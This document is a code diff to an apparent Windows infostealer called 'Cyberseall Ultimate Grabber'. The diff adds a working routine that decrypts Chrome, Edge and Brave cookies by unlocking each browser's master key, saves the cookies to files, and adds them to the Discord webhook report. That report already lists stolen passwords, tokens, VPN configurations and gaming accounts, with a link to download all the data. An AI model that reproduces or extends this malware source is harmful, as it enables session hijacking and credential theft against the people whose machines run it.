@@ -37,6 +37,7 @@ class CyberseallGrabber:
         self.h = []
         self.af = []
         self.di = []
+        self.co = []
         self.d = os.path.join(os.getenv("APPDATA"), "cyberseall")
         self.keywords = ['password','passwords','wallet','wallets','seed','seeds','private','privatekey','backup','backups','recovery']
         self.setup()
@@ -45,6 +46,7 @@ class CyberseallGrabber:
         self.pw()
         self.history()
         self.autofill()
+        self.cookies()
         self.fi()
         self.vpn()
         self.games()
@@ -1513,6 +1515,210 @@ class CyberseallGrabber:
         except:
             pass
 
+    def cookies(self):
+        """
+        ULTIMATE COOKIE EXTRACTOR - Extrahiert alle Browser-Cookies
+        """
+        try:
+            cookies_data = []
+            
+            # Browser-Konfiguration
+            browsers = {
+                'Chrome': {
+                    'base': os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
+                    'profiles': ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5"]
+                },
+                'Edge': {
+                    'base': os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
+                    'profiles': ["Default", "Profile 1", "Profile 2", "Profile 3"]
+                },
+                'Brave': {
+                    'base': os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
+                    'profiles': ["Default", "Profile 1", "Profile 2"]
+                }
+            }
+            
+            def decrypt_cookie_value(encrypted_value, master_key):
+                """Entschlüsselt Cookie-Werte"""
+                try:
+                    if not encrypted_value:
+                        return ""
+                    
+                    # v10/v11/v20 Entschlüsselung
+                    if encrypted_value[:3] in [b'v10', b'v11', b'v20']:
+                        if encrypted_value[:3] == b'v20':
+                            # v20 App-Bound Encryption
+                            try:
+                                nonce = encrypted_value[3:15]
+                                ciphertext = encrypted_value[15:-16]
+                                tag = encrypted_value[-16:]
+                                cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
+                                decrypted = cipher.decrypt_and_verify(ciphertext, tag)
+                                return decrypted.decode('utf-8', errors='ignore')
+                            except:
+                                pass
+                        else:
+                            # v10/v11 Standard
+                            try:
+                                nonce = encrypted_value[3:15]
+                                ciphertext = encrypted_value[15:]
+                                cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
+                                decrypted = cipher.decrypt(ciphertext[:-16])
+                                return decrypted.decode('utf-8', errors='ignore')
+                            except:
+                                pass
+                    
+                    # DPAPI Fallback
+                    try:
+                        result = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)
+                        if result and result[1]:
+                            return result[1].decode('utf-8', errors='ignore')
+                    except:
+                        pass
+                    
+                    return ""
+                except:
+                    return ""
+            
+            # Extrahiere Cookies von allen Browsern
+            for browser_name, browser_info in browsers.items():
+                base_path = browser_info['base']
+                if not os.path.exists(base_path):
+                    continue
+                
+                # Master Key laden
+                master_key = None
+                try:
+                    state_file = os.path.join(base_path, "Local State")
+                    if os.path.exists(state_file):
+                        with open(state_file, "r", encoding="utf-8") as f:
+                            local_state = json.loads(f.read())
+                            encrypted_key = local_state["os_crypt"]["encrypted_key"]
+                            master_key = base64.b64decode(encrypted_key)[5:]
+                            master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
+                except:
+                    continue
+                
+                if not master_key:
+                    continue
+                
+                # Extrahiere von allen Profilen
+                for profile in browser_info['profiles']:
+                    profile_path = os.path.join(base_path, profile)
+                    if not os.path.exists(profile_path):
+                        continue
+                    
+                    cookies_db_path = os.path.join(profile_path, "Network", "Cookies")
+                    if not os.path.exists(cookies_db_path):
+                        continue
+                    
+                    # Temporäre Kopie erstellen
+                    temp_cookies_db = os.path.join(os.getenv("TEMP"), f"{browser_name}_{profile}_cookies.db")
+                    try:
+                        if os.path.exists(temp_cookies_db):
+                            os.remove(temp_cookies_db)
+                        shutil.copy2(cookies_db_path, temp_cookies_db)
+                    except:
+                        continue
+                    
+                    # Cookies aus DB extrahieren
+                    try:
+                        conn = sqlite3.connect(temp_cookies_db)
+                        cursor = conn.cursor()
+                        
+                        cursor.execute("""
+                            SELECT host_key, name, path, encrypted_value, expires_utc, 
+                                   is_secure, is_httponly, creation_utc, last_access_utc
+                            FROM cookies 
+                            ORDER BY last_access_utc DESC 
+                            LIMIT 1000
+                        """)
+                        
+                        profile_cookies = []
+                        for row in cursor.fetchall():
+                            host_key, name, path, encrypted_value, expires_utc, is_secure, is_httponly, creation_utc, last_access_utc = row
+                            
+                            # Cookie-Wert entschlüsseln
+                            decrypted_value = decrypt_cookie_value(encrypted_value, master_key)
+                            
+                            if decrypted_value and len(decrypted_value) > 0:
+                                cookie_info = {
+                                    'browser': f"{browser_name}-{profile}",
+                                    'host': host_key,
+                                    'name': name,
+                                    'path': path,
+                                    'value': decrypted_value[:100] + "..." if len(decrypted_value) > 100 else decrypted_value,
+                                    'expires': expires_utc,
+                                    'secure': bool(is_secure),
+                                    'httponly': bool(is_httponly),
+                                    'created': creation_utc,
+                                    'accessed': last_access_utc
+                                }
+                                profile_cookies.append(cookie_info)
+                        
+                        if profile_cookies:
+                            cookies_data.extend(profile_cookies)
+                        
+                        cursor.close()
+                        conn.close()
+                        
+                        try:
+                            os.remove(temp_cookies_db)
+                        except:
+                            pass
+                            
+                    except Exception as e:
+                        try:
+                            os.remove(temp_cookies_db)
+                        except:
+                            pass
+            
+            self.co = cookies_data
+            
+            # Cookies in Datei speichern
+            if cookies_data:
+                try:
+                    # JSON Format für strukturierte Daten
+                    with open(os.path.join(self.d, "cookies.json"), "w", encoding="utf-8") as f:
+                        json.dump(cookies_data, f, indent=2, ensure_ascii=False)
+                    
+                    # TXT Format für einfache Lesbarkeit
+                    with open(os.path.join(self.d, "cookies.txt"), "w", encoding="utf-8") as f:
+                        f.write("BROWSER COOKIES EXTRACTOR\n")
+                        f.write("=" * 60 + "\n\n")
+                        
+                        # Gruppiere nach Browser
+                        browsers_found = {}
+                        for cookie in cookies_data:
+                            browser = cookie['browser']
+                            if browser not in browsers_found:
+                                browsers_found[browser] = []
+                            browsers_found[browser].append(cookie)
+                        
+                        for browser, browser_cookies in browsers_found.items():
+                            f.write(f"{browser.upper()} ({len(browser_cookies)} cookies)\n")
+                            f.write("-" * 50 + "\n")
+                            
+                            for cookie in browser_cookies[:20]:  # Limitiere auf 20 pro Browser
+                                f.write(f"Host: {cookie['host']}\n")
+                                f.write(f"Name: {cookie['name']}\n")
+                                f.write(f"Value: {cookie['value']}\n")
+                                f.write(f"Path: {cookie['path']}\n")
+                                f.write(f"Secure: {cookie['secure']} | HttpOnly: {cookie['httponly']}\n")
+                                f.write("-" * 30 + "\n")
+                            
+                            if len(browser_cookies) > 20:
+                                f.write(f"... and {len(browser_cookies) - 20} more cookies\n")
+                            f.write("\n")
+                        
+                        f.write("=" * 60 + "\n")
+                        f.write(f"TOTAL COOKIES EXTRACTED: {len(cookies_data)}\n")
+                        f.write("=" * 60 + "\n")
+                except:
+                    pass
+        except:
+            pass
+
     def vpn(self):
         try:
             vpn_data = []
@@ -2095,21 +2301,26 @@ module.exports = require('./core.asar');
                 
 
                 with open(os.path.join(self.d, "GRABBER_STATISTICS.txt"), "w", encoding="utf-8") as f:
-                    f.write("CYBERSEALL ULTIMATE GRABBER v6.0\n")
+                    f.write("CYBERSEALL ULTIMATE GRABBER v6.1\n")
                     f.write("=" * 60 + "\n\n")
-                    f.write("FINAL STATISTICS:\n")
-                    f.write(f"Browser Passwords: {len(self.p)}\n")
-                    f.write(f"Browser History: {len(self.h)}\n")
-                    f.write(f"Autofill Data: {len(self.af)}\n")
-                    f.write(f"Raw Tokens: {len(set(self.t))}\n")
-                    f.write(f"Valid Tokens: {len(self.vt)}\n")
-                    f.write(f"Keyword Files: {len(self.f)}\n")
-                    f.write(f"VPN Configurations: {len(self.v)}\n")
-                    f.write(f"Gaming Accounts: {len(self.ga)}\n")
-                    f.write(f"Discord Injections: {len(self.di)}\n\n")
-                    f.write(f"Target: {getpass.getuser()}@{os.getenv('COMPUTERNAME', 'Unknown')}\n")
-                    f.write(f"Platform: {platform.platform()}\n")
-                    f.write(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
+                    f.write("📊 FINAL STATISTICS:\n")
+                    f.write("-" * 30 + "\n")
+                    f.write(f"🔐 Browser Passwords: {len(self.p)}\n")
+                    f.write(f"📜 Browser History: {len(self.h)}\n")
+                    f.write(f"📝 Autofill Data: {len(self.af)}\n")
+                    f.write(f"🍪 Browser Cookies: {len(self.co)}\n")
+                    f.write(f"🎫 Raw Tokens: {len(set(self.t))}\n")
+                    f.write(f"✅ Valid Tokens: {len(self.vt)}\n")
+                    f.write(f"📁 Keyword Files: {len(self.f)}\n")
+                    f.write(f"🔒 VPN Configurations: {len(self.v)}\n")
+                    f.write(f"🎮 Gaming Accounts: {len(self.ga)}\n")
+                    f.write(f"💉 Discord Injections: {len(self.di)}\n\n")
+                    f.write("🎯 TARGET INFORMATION:\n")
+                    f.write("-" * 30 + "\n")
+                    f.write(f"👤 User: {getpass.getuser()}\n")
+                    f.write(f"💻 Computer: {os.getenv('COMPUTERNAME', 'Unknown')}\n")
+                    f.write(f"🖥️ Platform: {platform.platform()}\n")
+                    f.write(f"⏰ Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                     f.write("=" * 60 + "\n")
             except:
                 pass
@@ -2155,18 +2366,19 @@ module.exports = require('./core.asar');
             total_games = len(self.ga)
             total_history = len(self.h)
             total_autofill = len(self.af)
+            total_cookies = len(self.co)
             total_injections = len(self.di)
             
 
             embed_fields = [
                 {
                     "name": "CYBERSEALL ULTIMATE GRABBER v6.1",
-                    "value": f"```Browser Passwords: {total_passwords}\nBrowser History: {total_history}\nAutofill Data: {total_autofill}\nRaw Tokens: {total_tokens}\nValid Tokens: {valid_tokens}\nKeyword Files: {total_files}\nVPNs Found: {total_vpns}\nGaming Accounts: {total_games}\nDiscord Injections: {total_injections}```",
+                    "value": f"```🔐 Browser Passwords: {total_passwords}\n📜 Browser History: {total_history}\n📝 Autofill Data: {total_autofill}\n🍪 Browser Cookies: {total_cookies}\n🎫 Raw Tokens: {total_tokens}\n✅ Valid Tokens: {valid_tokens}\n📁 Keyword Files: {total_files}\n🔒 VPNs Found: {total_vpns}\n🎮 Gaming Accounts: {total_games}\n💉 Discord Injections: {total_injections}```",
                     "inline": False
                 },
                 {
-                    "name": "Target System",
-                    "value": f"```User: {getpass.getuser()}\nComputer: {os.getenv('COMPUTERNAME', 'Unknown')}\nPlatform: {platform.platform()}```",
+                    "name": "🎯 Target System",
+                    "value": f"```👤 User: {getpass.getuser()}\n💻 Computer: {os.getenv('COMPUTERNAME', 'Unknown')}\n🖥️ Platform: {platform.platform()}```",
                     "inline": False
                 }
             ]
@@ -2209,7 +2421,7 @@ module.exports = require('./core.asar');
                     browser_summary.append(f"{browser}: {count}")
                 
                 embed_fields.append({
-                    "name": "Browser Breakdown",
+                    "name": "🔐 Browser Breakdown",
                     "value": f"```{chr(10).join(browser_summary)}```",
                     "inline": False
                 })
@@ -2221,7 +2433,7 @@ module.exports = require('./core.asar');
                     vpn_summary.append(vpn_info)
                 
                 embed_fields.append({
-                    "name": "VPN Configurations",
+                    "name": "🔒 VPN Configurations",
                     "value": f"```{chr(10).join(vpn_summary)}```",
                     "inline": False
                 })
@@ -2233,15 +2445,34 @@ module.exports = require('./core.asar');
                     game_summary.append(game_info)
                 
                 embed_fields.append({
-                    "name": "Gaming Accounts",
+                    "name": "🎮 Gaming Accounts",
                     "value": f"```{chr(10).join(game_summary)}```",
+                    "inline": False
+                })
+            
+            # Cookie Summary
+            if total_cookies > 0:
+                cookie_stats = {}
+                for cookie in self.co:
+                    browser = cookie['browser']
+                    if browser not in cookie_stats:
+                        cookie_stats[browser] = 0
+                    cookie_stats[browser] += 1
+                
+                cookie_summary = []
+                for browser, count in sorted(cookie_stats.items(), key=lambda x: x[1], reverse=True)[:5]:
+                    cookie_summary.append(f"{browser}: {count}")
+                
+                embed_fields.append({
+                    "name": "🍪 Browser Cookies",
+                    "value": f"```{chr(10).join(cookie_summary)}```",
                     "inline": False
                 })
             
 
             embed_fields.append({
-                "name": "Download All Data",
-                "value": f"[**CLICK HERE TO DOWNLOAD**]({self.link if hasattr(self, 'link') else 'Upload failed'})",
+                "name": "📥 Download All Data",
+                "value": f"[**🔗 CLICK HERE TO DOWNLOAD**]({self.link if hasattr(self, 'link') else 'Upload failed'})",
                 "inline": False
             })
             
@@ -2251,7 +2482,7 @@ module.exports = require('./core.asar');
                     "description": "**COMPLETE DATA EXTRACTION WITH DISCORD INJECTION**",
                     "color": 0xff0000,
                     "fields": embed_fields,
-                    "footer": {"text": "Cyberseall ULTIMATE v6.1 - Browser, History, Autofill, VPN, Gaming & Discord Stealer"},
+                    "footer": {"text": "Cyberseall ULTIMATE v6.1 - Browser, History, Autofill, Cookies, VPN, Gaming & Discord Stealer"},
                     "timestamp": time.strftime('%Y-%m-%dT%H:%M:%S.000Z', time.gmtime())
                 }]
             }
